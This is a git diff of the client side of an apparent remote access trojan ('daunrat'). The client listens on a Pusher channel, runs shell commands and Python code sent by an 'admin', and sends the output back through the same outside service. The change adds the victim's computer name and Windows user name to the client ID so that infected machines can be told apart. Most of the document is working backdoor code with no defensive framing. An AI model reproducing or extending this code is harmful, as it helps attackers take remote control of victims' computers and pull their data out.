@@ -5,11 +5,12 @@ import io
 from contextlib import redirect_stdout
 import subprocess
 import sys
+import os
 sys.path.append('daun/modules')
 import daun.modules as daun  # needed to use daun functionality from admin
 from modules.selfutil import daunrat  # needed to use self utility functions
 
-client_id = int()
+client_id = str()
 
 client = pusher.Pusher(
     app_id=app_id,
@@ -29,8 +30,8 @@ def on_command(data):
                                       close_fds=True, text=True).communicate()
     except Exception as e:
         shell_logs = str(e)
-    client.trigger('client-' + str(client_id), 'logs', shell_logs)
-    print("Shell logs sent on client-" + str(client_id))
+    client.trigger('client-' + client_id, 'logs', shell_logs)
+    print("Shell logs sent on client-" + client_id)
     print("Shell logs: " + shell_logs)
 
 
@@ -44,14 +45,14 @@ def on_python(data):
         except Exception as e:
             print(e)
     python_logs = f.getvalue().strip()
-    client.trigger('client-' + str(client_id), 'logs', python_logs)
-    print("Python logs sent on client-" + str(client_id))
+    client.trigger('client-' + client_id, 'logs', python_logs)
+    print("Python logs sent on client-" + client_id)
     print(python_logs)
 
 
 def ping(data):
     print("Triggered ping")
-    client.trigger('client-' + str(client_id), 'ping', 'pong')
+    client.trigger('client-' + client_id, 'ping', 'pong')
 
 
 def handle_connection_to_server(connection):
@@ -59,10 +60,11 @@ def handle_connection_to_server(connection):
     print("Connected to server")
     print("Server returned: " + str(connection))
     try:
-        client_id = str(int(list(client.channels_info(prefix_filter='admin-')['channels'])[-1].split('-')[-1]) + 1)
+        client_id = str(int(list(client.channels_info(prefix_filter='admin-')['channels'])[-1].split('-')[-1]
+                            .split('@')[0]) + 1) + f'@{os.getenv("COMPUTERNAME")}@{os.getenv("UserName")}'
     except IndexError:
-        client_id = '0'
-    channel = receiver.subscribe('admin-' + client_id)
+        client_id = f'0@{os.getenv("COMPUTERNAME")}@{os.getenv("UserName")}'
+    channel = receiver.subscribe(f'admin-{client_id}')
     print("Client id: " + client_id)
     channel.bind('connection_from_admin', lambda _: print("Connection from admin"))
     channel.bind('ping', ping)
